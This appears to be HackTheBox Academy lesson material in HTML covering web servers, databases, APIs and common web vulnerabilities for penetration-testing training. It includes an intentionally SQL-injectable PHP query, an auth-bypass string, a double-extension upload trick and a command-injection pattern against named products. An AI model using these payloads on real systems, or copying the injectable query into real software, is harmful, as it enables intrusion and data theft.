+<p>A <a href="https://en.wikipedia.org/wiki/Web_server">web server</a> is an application that runs on the back end server, which handles all of the HTTP traffic from the client-side browser, routes it to the requested pages, and finally responds to the client-side browser. Web servers usually run on TCP <a href="https://en.wikipedia.org/wiki/Port_\(computer_networking\">ports</a>) <code>80</code> or <code>443</code>, and are responsible for connecting end-users to various parts of the web application, in addition to handling their various responses.</p>
+<hr>
+<h3 id="workflow">Workflow</h3>
+<p>A typical web server accepts HTTP requests from the client-side, and responds with different HTTP responses and codes, like a code <code>200 OK</code> response for a successful request, a code <code>404 NOT FOUND</code> when requesting pages that do not exist, code <code>403 FORBIDDEN</code> for requesting access to restricted pages, and so on.</p>
+<p><img src="storage\modules\75\web-server-requests.jpg" alt="web server"></p>
+<p>The following are some of the most common <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status">HTTP response codes</a>:</p>
+<table>
+<thead>
+<tr>
+<th>Code</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Successful responses</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>200 OK</code></td>
+<td>The request has succeeded</td>
+</tr>
+<tr>
+<td><strong>Redirection messages</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>301 Moved Permanently</code></td>
+<td>The URL of the requested resource has been changed permanently</td>
+</tr>
+<tr>
+<td><code>302 Found</code></td>
+<td>The URL of the requested resource has been changed temporarily</td>
+</tr>
+<tr>
+<td><strong>Client error responses</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>400 Bad Request</code></td>
+<td>The server could not understand the request due to invalid syntax</td>
+</tr>
+<tr>
+<td><code>401 Unauthorized</code></td>
+<td>Unauthenticated attempt to access page</td>
+</tr>
+<tr>
+<td><code>403 Forbidden</code></td>
+<td>The client does not have access rights to the content</td>
+</tr>
+<tr>
+<td><code>404 Not Found</code></td>
+<td>The server can not find the requested resource</td>
+</tr>
+<tr>
+<td><code>405 Method Not Allowed</code></td>
+<td>The request method is known by the server but has been disabled and cannot be used</td>
+</tr>
+<tr>
+<td><code>408 Request Timeout</code></td>
+<td>This response is sent on an idle connection by some servers, even without any previous request by the client</td>
+</tr>
+<tr>
+<td><strong>Server error responses</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>500 Internal Server Error</code></td>
+<td>The server has encountered a situation it doesn't know how to handle</td>
+</tr>
+<tr>
+<td><code>502 Bad Gateway</code></td>
+<td>The server, while working as a gateway to get a response needed to handle the request, received an invalid response</td>
+</tr>
+<tr>
+<td><code>504 Gateway Timeout</code></td>
+<td>The server is acting as a gateway and cannot get a response in time</td>
+</tr>
+</tbody>
+</table>
+<p>Web servers also accept various types of user input within HTTP requests, including text, <a href="https://www.w3schools.com/js/js_json_intro.asp">JSON</a>, and even binary data (i.e., for file uploads). Once a web server receives a web request, it is then responsible for routing it to its destination, run any processes needed for that request, and return the response to the user on the client-side. The pages and files that the webserver processes and routes traffic to are the web application core files.</p>
+<p>The following shows an example of requesting a page in a Linux terminal using the <a href="https://en.wikipedia.org/wiki/CURL">cURL</a> utility, and receiving the server response while using the <code>-I</code> flag, which displays the headers:</p>
+<p>Web Servers</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl -I https:/</span>/academy.hackthebox.com
+
+HTTP/<span class="hljs-number">2</span> <span class="hljs-number">200</span>
+<span class="hljs-string">date:</span> Tue, <span class="hljs-number">15</span> Dec <span class="hljs-number">2020</span> <span class="hljs-number">19</span>:<span class="hljs-number">54</span>:<span class="hljs-number">29</span> GMT
+content-<span class="hljs-string">type:</span> text/html; charset=UTF<span class="hljs-number">-8</span>
+...SNIP...
+</code></pre>
+<p>While this <code>cURL</code> command example shows us the source code of the webpage:</p>
+<p>Web Servers</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl https://academy.hackthebox.com
+
+<span class="hljs-meta">&lt;!doctype html&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Cyber Security Training : HTB Academy<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
+</code></pre>
+<p>Many web server types can be utilized to run web applications. Most of these can handle all types of complex HTTP requests, and they are usually free of charge. We can even develop our own basic web server using languages such as <code>Python</code>, <code>JavaScript</code>, and <code>PHP</code>. However, for each language, there's a popular web application that is optimized for handling large amounts of web traffic, which saves us time in creating our own web server.</p>
+<hr>
+<h3 id="apache">Apache</h3>
+<p><img src="storage\modules\75\apache.png" alt="Apache"></p>
+<p><a href="https://www.apache.org/">Apache</a> 'or <code>httpd</code>' is the most common web server on the internet, hosting more than <code>40%</code> of all internet websites. <code>Apache</code> usually comes pre-installed in most <code>Linux</code> distributions and can also be installed on Windows and macOS servers.</p>
+<p><code>Apache</code> is usually used with <code>PHP</code> for web application development, but it also supports other languages like <code>.Net</code>, <code>Python</code>, <code>Perl</code>, and even OS languages like <code>Bash</code> through <code>CGI</code>. Users can install a wide variety of <code>Apache</code> modules to extend its functionality and support more languages. For example, to support serving <code>PHP</code> files, users must install <code>PHP</code> on the back end server, in addition to installing the <code>mod_php</code> module for <code>Apache</code>.</p>
+<p><code>Apache</code> is an open-source project, and community users can access its source code to fix issues and look for vulnerabilities. It is well-maintained and regularly patched against vulnerabilities to keep it safe against exploitation. Furthermore, it is very well documented, making using and configuring different parts of the webserver relatively easy. <code>Apache</code> is commonly used by startups and smaller companies, as it is straightforward to develop for. Still, some big companies utilize Apache, including:</p>
+<table>
+<thead>
+<tr>
+<th><code>Apple</code></th>
+<th><code>Adobe</code></th>
+<th><code>Baidu</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="nginx">NGINX</h3>
+<p><img src="storage\modules\75\nginx.png" alt="NGINX"></p>
+<p><a href="https://www.nginx.com/">NGINX</a> is the second most common web server on the internet, hosting roughly <code>30%</code> of all internet websites. <code>NGINX</code> focuses on serving many concurrent web requests with relatively low memory and CPU load by utilizing an async architecture to do so. This makes <code>NGINX</code> a very reliable web server for popular web applications and top businesses worldwide, which is why it is the most popular web server among high traffic websites, with around 60% of the top 100,000 websites using <code>NGINX</code>.</p>
+<p><code>NGINX</code> is also free and open-source, which gives all the same benefits previously mentioned, like security and reliability. Some popular websites that utilize <code>NGINX</code> include:</p>
+<table>
+<thead>
+<tr>
+<th><code>Google</code></th>
+<th><code>Facebook</code></th>
+<th><code>Twitter</code></th>
+<th><code>Cisco</code></th>
+<th><code>Intel</code></th>
+<th><code>Netflix</code></th>
+<th><code>HackTheBox</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="iis">IIS</h3>
+<p><img src="storage\modules\75\iis.png" alt="iis"></p>
+<p><a href="https://en.wikipedia.org/wiki/Internet_Information_Services">IIS (Internet Information Services)</a> is the third most common web server on the internet, hosting around <code>15%</code> of all internet web sites. <code>IIS</code> is developed and maintained by Microsoft and mainly runs on Microsoft Windows Servers. <code>IIS</code> is usually used to host web applications developed for the Microsoft .NET framework, but can also be used to host web applications developed in other languages like <code>PHP</code>, or host other types of services like <code>FTP</code>. Furthermore, <code>IIS</code> is very well optimized for Active Directory integration and includes features like <code>Windows Auth</code> for authenticating users using Active Directory, allowing them to automatically sign in to web applications.</p>
+<p>Though not the most popular web server, many big organizations use <code>IIS</code> as their web server. Many of them use Windows Server on their back end or rely heavily on Active Directory within their organization. Some popular websites that utilize IIS include:</p>
+<table data-header-hidden=""><thead><tr><th width="145"></th><th width="135"></th><th></th><th width="145"></th><th></th></tr></thead><tbody><tr><td><code>Microsoft</code></td><td><code>Office365</code></td><td><code>Skype</code></td><td><code>Stack Overflow</code></td><td><code>Dell</code></td></tr></tbody></table>
+
+<p>Aside from these 3 web servers, there are many other commonly used web servers, like <a href="https://tomcat.apache.org/">Apache Tomcat</a> for <code>Java</code> web applications, and <a href="https://nodejs.org/en/">Node.JS</a> for web applications developed using <code>JavaScript</code> on the back end.</p>
+<h2 id="databases">Databases</h2>
+<hr>
+<p>Web applications utilize back end <a href="https://en.wikipedia.org/wiki/Database">databases</a> to store various content and information related to the web application. This can be core web application assets like images and files, web application content like posts and updates, or user data like usernames and passwords. This allows web applications to easily and quickly store and retrieve data and enable dynamic content that is different for each user.</p>
+<p>There are many different types of databases, each of which fits a certain type of use. Most developers look for certain characteristics in a database, such as <code>speed</code> in storing and retrieving data, <code>size</code> when storing large amounts of data, <code>scalability</code> as the web application grows, and <code>cost</code>.</p>
+<hr>
+<h3 id="relational-sql-">Relational (SQL)</h3>
+<p><a href="https://en.wikipedia.org/wiki/Relational_database">Relational</a> (SQL) databases store their data in tables, rows, and columns. Each table can have unique keys, which can link tables together and create relationships between tables.</p>
+<p>For example, we can have a <code>users</code> table in a relational database containing columns like <code>id</code>, <code>username</code>, <code>first_name</code>, <code>last_name</code>, and so on. The <code>id</code> can be used as the table key. Another table, <code>posts</code>, may contain posts made by all users, with columns like <code>id</code>, <code>user_id</code>, <code>date</code>, <code>content</code>, and so on.</p>
+<p><img src="storage\modules\75\web_apps_relational_db.jpg" alt="HTML Example"></p>
+<p>We can link the <code>id</code> from the <code>users</code> table to the <code>user_id</code> in the <code>posts</code> table to easily retrieve the user details for each post, without having to store all user details with each post.</p>
+<p>A table can have more than one key, as another column can be used as a key to link with another table. For example, the <code>id</code> column can be used as a key to link the <code>posts</code> table to another table containing comments, each of which belongs to a certain post, and so on.</p>
+<p>The relationship between tables within a database is called a Schema.</p>
+<p>This way, by using relational databases, it becomes very quick and easy to retrieve all data about a certain element from all databases. For example, we can retrieve all details linked to a certain user from all tables with a single query. This makes relational databases very fast and reliable for big datasets that have a clear structure and design. Databases also make data management very efficient.</p>
+<p>Some of the most common relational databases include:</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://en.wikipedia.org/wiki/MySQL">MySQL</a></td>
+<td>The most commonly used database around the internet. It is an open-source database and can be used completely free of charge</td>
+</tr>
+<tr>
+<td><a href="https://en.wikipedia.org/wiki/Microsoft_SQL_Server">MSSQL</a></td>
+<td>Microsoft's implementation of a relational database. Widely used with Windows Servers and IIS web servers</td>
+</tr>
+<tr>
+<td><a href="https://en.wikipedia.org/wiki/Oracle_Database">Oracle</a></td>
+<td>A very reliable database for big businesses, and is frequently updated with innovative database solutions to make it faster and more reliable. It can be costly, even for big businesses</td>
+</tr>
+<tr>
+<td><a href="https://en.wikipedia.org/wiki/PostgreSQL">PostgreSQL</a></td>
+<td>Another free and open-source relational database. It is designed to be easily extensible, enabling adding advanced new features without needing a major change to the initial database design</td>
+</tr>
+</tbody>
+</table>
+<p>Other common SQL databases include: <code>SQLite</code>, <code>MariaDB</code>, <code>Amazon Aurora</code>, and <code>Azure SQL</code>.</p>
+<hr>
+<h3 id="non-relational-nosql-">Non-relational (NoSQL)</h3>
+<p>A <a href="https://en.wikipedia.org/wiki/NoSQL">non-relational database</a> does not use tables, rows, columns, primary keys, relationships, or schemas. Instead, a <code>NoSQL</code> database stores data using various storage models, depending on the type of data stored.</p>
+<p>Due to the lack of a defined structure for the database, <code>NoSQL</code> databases are very scalable and flexible. When dealing with datasets that are not very well defined and structured, a <code>NoSQL</code> database would be the best choice for storing our data.</p>
+<p>There are 4 common storage models for <code>NoSQL</code> databases:</p>
+<ul>
+<li>Key-Value</li>
+<li>Document-Based</li>
+<li>Wide-Column</li>
+<li>Graph</li>
+</ul>
+<p>Each of the above models has a different way of storing data. For example, the <code>Key-Value</code> model usually stores data in <code>JSON</code> or <code>XML</code>, and has a key for each pair, storing all of its data as its value:</p>
+<p><img src="storage\modules\75\web_apps_non-relational_db.jpg" alt="HTML Example"></p>
+<p>The above example can be represented using <code>JSON</code> as follows:</p>
+<p>Code: json</p>
+<pre><code class="lang-json">{
+  <span class="hljs-attr">"100001"</span>: {
+    <span class="hljs-attr">"date"</span>: <span class="hljs-string">"01-01-2021"</span>,
+    <span class="hljs-attr">"content"</span>: <span class="hljs-string">"Welcome to this web application."</span>
+  },
+  <span class="hljs-attr">"100002"</span>: {
+    <span class="hljs-attr">"date"</span>: <span class="hljs-string">"02-01-2021"</span>,
+    <span class="hljs-attr">"content"</span>: <span class="hljs-string">"This is the first post on this web app."</span>
+  },
+  <span class="hljs-attr">"100003"</span>: {
+    <span class="hljs-attr">"date"</span>: <span class="hljs-string">"02-01-2021"</span>,
+    <span class="hljs-attr">"content"</span>: <span class="hljs-string">"Reminder: Tomorrow is the ..."</span>
+  }
+}
+</code></pre>
+<p>It looks similar to a dictionary/map/key-value pair in languages like <code>Python</code> or <code>PHP</code> 'i.e. <code>{'key':'value'}</code>', where the <code>key</code> is usually a string, the <code>value</code> can be a string, dictionary, or any class object.</p>
+<p>The <code>Document-Based</code> model stores data in complex <code>JSON</code> objects and each object has certain meta-data while storing the rest of the data similarly to the <code>Key-Value</code> model.</p>
+<p>Some of the most common <code>NoSQL</code> databases include:</p>
+<table><thead><tr><th width="194">Type</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://en.wikipedia.org/wiki/MongoDB">MongoDB</a></td><td>The most common <code>NoSQL</code> database. It is free and open-source, uses the <code>Document-Based</code> model, and stores data in <code>JSON</code> objects</td></tr><tr><td><a href="https://en.wikipedia.org/wiki/Elasticsearch">ElasticSearch</a></td><td>Another free and open-source <code>NoSQL</code> database. It is optimized for storing and analyzing huge datasets. As its name suggests, searching for data within this database is very fast and efficient</td></tr><tr><td><a href="https://en.wikipedia.org/wiki/Apache_Cassandra">Apache Cassandra</a></td><td>Also free and open-source. It is very scalable and is optimized for gracefully handling faulty values</td></tr></tbody></table>
+
+<p>Other common <code>NoSQL</code> databases include: <code>Redis</code>, <code>Neo4j</code>, <code>CouchDB</code>, and <code>Amazon DynamoDB</code>.</p>
+<hr>
+<h3 id="use-in-web-applications">Use in Web Applications</h3>
+<p>Most modern web development languages and frameworks make it easy to integrate, store, and retrieve data from various database types. But first, the database has to be installed and set up on the back end server, and once it is up and running, the web applications can start utilizing it to store and retrieve data.</p>
+<p>For example, within a <code>PHP</code> web application, once <code>MySQL</code> is up and running, we can connect to the database server with:</p>
+<pre><code class="lang-php"><span class="hljs-built_in">$conn</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">"localhost"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"pass"</span>)<span class="hljs-comment">;</span>
+</code></pre>
+<p>Then, we can create a new database with:</p>
+<pre><code class="lang-php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">"CREATE DATABASE database1"</span>;
+<span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>)
+</code></pre>
+<p>After that, we can connect to our new database, and start using the <code>MySQL</code> database through <code>MySQL</code> syntax, right within <code>PHP</code>, as follows:</p>
+<pre><code class="lang-php">$conn = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">"localhost"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"pass"</span>, <span class="hljs-string">"database1"</span>);
+$query = <span class="hljs-string">"select * from table_1"</span>;
+$result = $conn-&gt;query($query);
+</code></pre>
+<p>Web applications usually use user-input when retrieving data. For example, when a user uses the search function to search for other users, their search input is passed to the web application, which uses the input to search within the database(s).</p>
+<pre><code class="lang-php"><span class="hljs-variable">$searchInput</span> =  <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'findUser'</span>];
+<span class="hljs-variable">$query</span> = <span class="hljs-string">"select * from users where name like '%<span class="hljs-variable">$searchInput</span>%'"</span>;
+<span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$query</span>);
+</code></pre>
+<p>Finally, the web application sends the result back to the user:</p>
+<pre><code class="lang-php"><span class="hljs-keyword">while</span>($row = $result-&gt;fetch_assoc() ){
+    <span class="hljs-keyword">echo</span> $row[<span class="hljs-string">"name"</span>].<span class="hljs-string">"&lt;br&gt;"</span>;
+}
+</code></pre>
+<p>This basic example shows us how easy it is to utilize databases. However, if not securely coded, database code can lead to a variety of issues, like <a href="https://owasp.org/www-community/attacks/SQL_Injection">SQL Injection vulnerabilities</a>.</p>
+<h2 id="development-frameworks-apis">Development Frameworks &amp; APIs</h2>
+<hr>
+<p>In addition to web servers that can host web applications in various languages, there are many common web development frameworks that help in developing core web application files and functionality. With the increased complexity of web applications, it may be challenging to create a modern and sophisticated web application from scratch. Hence, most of the popular web applications are developed using web frameworks.</p>
+<p>As most web applications share common functionality -such as user registration-, web development frameworks make it easy to quickly implement this functionality and link them to the front end components, making a fully functional web application. Some of the most common web development frameworks include:</p>
+<ul>
+<li><a href="https://laravel.com/">Laravel</a> (<code>PHP</code>): usually used by startups and smaller companies, as it is powerful yet easy to develop for.</li>
+<li><a href="https://expressjs.com/">Express</a> (<code>Node.JS</code>): used by <code>PayPal</code>, <code>Yahoo</code>, <code>Uber</code>, <code>IBM</code>, and <code>MySpace</code>.</li>
+<li><a href="https://www.djangoproject.com/">Django</a> (<code>Python</code>): used by <code>Google</code>, <code>YouTube</code>, <code>Instagram</code>, <code>Mozilla</code>, and <code>Pinterest</code>.</li>
+<li><a href="https://rubyonrails.org/">Rails</a> (<code>Ruby</code>): used by <code>GitHub</code>, <code>Hulu</code>, <code>Twitch</code>, <code>Airbnb</code>, and even <code>Twitter</code> in the past.</li>
+</ul>
+<p>It must be noted that popular websites usually utilize a variety of frameworks and web servers, rather than just one.</p>
+<hr>
+<h3 id="apis">APIs</h3>
+<p>An important aspect of back end web application development is the use of Web <a href="https://en.wikipedia.org/wiki/API">APIs</a> and HTTP Request parameters to connect the front end and the back end to be able to send data back and forth between front end and back end components and carry out various functions within the web application.</p>
+<p>For the front end component to interact with the back end and ask for certain tasks to be carried out, they utilize APIs to ask the back end component for a specific task with specific input. The back end components process these requests, perform the necessary functions, and return a certain response to the front end components, which finally renderers the end user's output on the client-side.</p>
+<hr>
+<p><strong>Query Parameters</strong></p>
+<p>The default method of sending specific arguments to a web page is through <code>GET</code> and <code>POST</code> request parameters. This allows the front end components to specify values for certain parameters used within the page for the back end components to process them and respond accordingly.</p>
+<p>For example, a <code>/search.php</code> page would take an <code>item</code> parameter, which may be used to specify the search item. Passing a parameter through a <code>GET</code> request is done through the URL '<code>/search.php?item=apples</code>', while <code>POST</code> parameters are passed through <code>POST</code> data at the bottom of the <code>POST</code> <code>HTTP</code> request:</p>
+<p>Code: http</p>
+<pre><code class="lang-http">POST /search<span class="hljs-selector-class">.php</span> HTTP/<span class="hljs-number">1.1</span>
+..<span class="hljs-selector-class">.SNIP</span>...
+
+item=apples
+</code></pre>
+<p>Query parameters allow a single page to receive various types of input, each of which can be processed differently. For certain other scenarios, Web APIs may be much quicker and more efficient to use. The <a href="https://academy.hackthebox.com/course/preview/web-requests">Web Requests module</a> takes a deeper dive into <code>HTTP</code> requests.</p>
+<hr>
+<h3 id="web-apis">Web APIs</h3>
+<p>An API (<a href="https://en.wikipedia.org/wiki/API">Application Programming Interface</a>) is an interface within an application that specifies how the application can interact with other applications. For Web Applications, it is what allows remote access to functionality on back end components. APIs are not exclusive to web applications and are used for software applications in general. Web APIs are usually accessed over the <code>HTTP</code> protocol and are usually handled and translated through web servers.</p>
+<p><img src="storage\modules\75\api_examples.jpg" alt="API examples"></p>
+<p>A weather web application, for example, may have a certain API to retrieve the current weather for a certain city. We can request the API URL and pass the city name or city id, and it would return the current weather in a <code>JSON</code> object. Another example is Twitter's API, which allows us to retrieve the latest Tweets from a certain account in <code>XML</code> or <code>JSON</code> formats, and even allows us to send a Tweet 'if authenticated', and so on.</p>
+<p>To enable the use of APIs within a web application, the developers have to develop this functionality on the back end of the web application by using the API standards like <code>SOAP</code> or <code>REST</code>.</p>
+<hr>
+<h3 id="soap">SOAP</h3>
+<p>The <code>SOAP</code> (<a href="https://en.wikipedia.org/wiki/SOAP">Simple Objects Access</a>) standard shares data through <code>XML</code>, where the request is made in <code>XML</code> through an HTTP request, and the response is also returned in <code>XML</code>. Front end components are designed to parse this <code>XML</code> output properly. The following is an example <code>SOAP</code> message:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span>
+<span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">"http://www.example.com/soap/soap/"</span>
+<span class="hljs-attr">soap:encodingStyle</span>=<span class="hljs-string">"http://www.w3.org/soap/soap-encoding"</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">soap:Header</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">soap:Header</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">soap:Fault</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Fault</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span>
+
+<span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span>
+</code></pre>
+<p><code>SOAP</code> is very useful for transferring structured data (i.e., an entire class object), or even binary data, and is often used with serialized objects, all of which enables sharing complex data between front end and back end components and parsing it properly. It is also very useful for sharing <em>stateful</em> objects -i.e., sharing/changing the current state of a web page-, which is becoming more common with modern web applications and mobile applications.</p>
+<p>However, <code>SOAP</code> may be difficult to use for beginners or require long and complicated requests even for smaller queries, like basic <code>search</code> or <code>filter</code> queries. This is where the <code>REST</code> API standard is more useful.</p>
+<hr>
+<h3 id="rest">REST</h3>
+<p>The <code>REST</code> (<a href="https://en.wikipedia.org/wiki/Representational_state_transfer">Representational State Transfer</a>) standard shares data through the URL path 'i.e. <code>search/users/1</code>', and usually returns the output in <code>JSON</code> format 'i.e. userid <code>1</code>'.</p>
+<p>Unlike Query Parameters, <code>REST</code> APIs usually focus on pages that expect one type of input passed directly through the URL path, without specifying its name or type. This is usually useful for queries like <code>search</code>, <code>sort</code>, or <code>filter</code>. This is why <code>REST</code> APIs usually break web application functionality into smaller APIs and utilize these smaller API requests to allow the web application to perform more advanced actions, making the web application more modular and scalable.</p>
+<p>Responses to <code>REST</code> API requests are usually made in <code>JSON</code> format, and the front end components are then developed to handle this response and render it properly. Other output formats for <code>REST</code> include <code>XML</code>, <code>x-www-form-urlencoded</code>, or even raw data. As seen previously in the <code>database</code> section, the following is an example of a <code>JSON</code> response to the <code>GET /category/posts/</code> API request:</p>
+<p>Code: json</p>
+<pre><code class="lang-json">{
+  <span class="hljs-attr">"100001"</span>: {
+    <span class="hljs-attr">"date"</span>: <span class="hljs-string">"01-01-2021"</span>,
+    <span class="hljs-attr">"content"</span>: <span class="hljs-string">"Welcome to this web application."</span>
+  },
+  <span class="hljs-attr">"100002"</span>: {
+    <span class="hljs-attr">"date"</span>: <span class="hljs-string">"02-01-2021"</span>,
+    <span class="hljs-attr">"content"</span>: <span class="hljs-string">"This is the first post on this web app."</span>
+  },
+  <span class="hljs-attr">"100003"</span>: {
+    <span class="hljs-attr">"date"</span>: <span class="hljs-string">"02-01-2021"</span>,
+    <span class="hljs-attr">"content"</span>: <span class="hljs-string">"Reminder: Tomorrow is the ..."</span>
+  }
+}
+</code></pre>
+<p><code>REST</code> uses various HTTP methods to perform different actions on the web application:</p>
+<ul>
+<li><code>GET</code> request to retrieve data</li>
+<li><code>POST</code> request to create data (non-idempotent)</li>
+<li><code>PUT</code> request to create or replace existing data (idempotent)</li>
+<li><code>DELETE</code> request to remove data</li>
+</ul>
+<h2 id="common-web-vulnerabilities">Common Web Vulnerabilities</h2>
+<hr>
+<p>If we were performing a penetration test on an internally developed web application or did not find any public exploits for a public web application, we may manually identify several vulnerabilities. We may also uncover vulnerabilities caused by misconfigurations, even in publicly available web applications, since these types of vulnerabilities are not caused by the public version of the web application but by a misconfiguration made by the developers. The below examples are some of the most common vulnerability types for web applications, part of <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a> vulnerabilities for web applications.</p>
+<hr>
+<h3 id="broken-authentication-access-control">Broken Authentication/Access Control</h3>
+<p><code>Broken authentication</code> and <code>Broken Access Control</code> are among the most common and most dangerous vulnerabilities for web applications.</p>
+<p><code>Broken Authentication</code> refers to vulnerabilities that allow attackers to bypass authentication functions. For example, this may allow an attacker to login without having a valid set of credentials or allow a normal user to become an administrator without having the privileges to do so.</p>
+<p><code>Broken Access Control</code> refers to vulnerabilities that allow attackers to access pages and features they should not have access to. For example, a normal user gaining access to the admin panel.</p>
+<p>For example, <code>College Management System 1.2</code> has a simple <a href="https://www.exploit-db.com/exploits/47388">Auth Bypass</a> vulnerability that allows us to login without having an account, by inputting the following for the email field: <code>' or 0=0 #</code>, and using any password with it.</p>
+<hr>
+<h3 id="malicious-file-upload">Malicious File Upload</h3>
+<p>Another common way to gain control over web applications is through uploading malicious scripts. If the web application has a file upload feature and does not properly validate the uploaded files, we may upload a malicious script (i.e., a <code>PHP</code> script), which will allow us to execute commands on the remote server.</p>
+<p>Even though this is a basic vulnerability, many developers are not aware of these threats, so they do not properly check and validate uploaded files. Furthermore, some developers do perform checks and attempt to validate uploaded files, but these checks can often be bypassed, which would still allow us to upload malicious scripts.</p>
+<p>For example, the WordPress Plugin <code>Responsive Thumbnail Slider 1.0</code> can be exploited to upload any arbitrary file, including malicious scripts, by uploading a file with a double extension (i.e. <code>shell.php.jpg</code>). There's even a <a href="https://www.rapid7.com/db/modules/exploit/multi/http/wp_responsive_thumbnail_slider_upload/">Metasploit Module</a> that allows us to exploit this vulnerability easily.</p>
+<hr>
+<h3 id="command-injection">Command Injection</h3>
+<p>Many web applications execute local Operating System commands to perform certain processes. For example, a web application may install a plugin of our choosing by executing an OS command that downloads that plugin, using the plugin name provided. If not properly filtered and sanitized, attackers may be able to inject another command to be executed alongside the originally intended command (i.e., as the plugin name), which allows them to directly execute commands on the back end server and gain control over it. This type of vulnerability is called <a href="https://owasp.org/www-community/attacks/Command_Injection">command injection</a>.</p>
+<p>This vulnerability is widespread, as developers may not properly sanitize user input or use weak tests to do so, allowing attackers to bypass any checks or filtering put in place and execute their commands.</p>
+<p>For example, the WordPress Plugin <code>Plainview Activity Monitor 20161228</code> has a <a href="https://www.exploit-db.com/exploits/45274">vulnerability</a> that allows attackers to inject their command in the <code>ip</code> value, by simply adding <code>| COMMAND...</code> after the <code>ip</code> value.</p>
+<hr>
+<h3 id="sql-injection-sqli-">SQL Injection (SQLi)</h3>
+<p>Another very common vulnerability in web applications is a <code>SQL Injection</code> vulnerability. Similarly to a Command Injection vulnerability, this vulnerability may occur when the web application executes a SQL query, including a value taken from user-supplied input.</p>
+<p>For example, in the <code>database</code> section, we saw an example of how a web application would use user-input to search within a certain table, with the following line of code:</p>
+<p>Code: php</p>
+<pre><code class="lang-php">$query = "<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">like</span> <span class="hljs-string">'%$searchInput%'</span><span class="hljs-string">";</span>
+</code></pre>
+<p>If the user input is not properly filtered and validated (as is the case with <code>Command Injections</code>), we may execute another SQL query alongside this query, which may eventually allow us to take control over the database and its hosting server.</p>
+<p>For example, the same previous <code>College Management System 1.2</code> suffers from a SQL injection <a href="https://www.exploit-db.com/exploits/47388">vulnerability</a>, in which we can execute another <code>SQL</code> query that always returns <code>true</code>, meaning we successfully authenticated, which allows us to log in to the application. We can use the same vulnerability to retrieve data from the database or even gain control over the hosting server.</p>
+<p>We will see these vulnerabilities again and again in our learning journey and real-world assessments. It is important to become familiar with each of these as even a basic understanding of each will give us a leg up in any information security realm. Later modules will cover each of these vulnerabilities in-depth.</p>
+<h2 id="public-vulnerabilities">Public Vulnerabilities</h2>
+<hr>
+<p>The most critical back end component vulnerabilities are those that can be attacked externally and can be leveraged to take control over the back end server without needing local access to that server (i.e., external penetration testing). These vulnerabilities are usually caused by coding mistakes made during the development of a web application's back-end components. So, there is a wide variety of vulnerability types in this area, ranging from basic vulnerabilities that can be exploited with relative ease to sophisticated vulnerabilities requiring deep knowledge of the entire web application.</p>
+<hr>
+<h3 id="public-cve">Public CVE</h3>
+<p>As many organizations deploy web applications that are publicly used, like open-source and proprietary web applications, these web applications tend to be tested by many organizations and experts around the world. This leads to frequently uncovering a large number of vulnerabilities, most of which get patched and then shared publicly and assigned a CVE (<a href="https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures">Common Vulnerabilities and Exposures</a>) record and score.</p>
+<p>Many penetration testers also make proof of concept exploits to test whether a certain public vulnerability can be exploited and usually make these exploits available for public use, for testing and educational purposes. This makes searching for public exploits the very first step we must go through for web applications.</p>
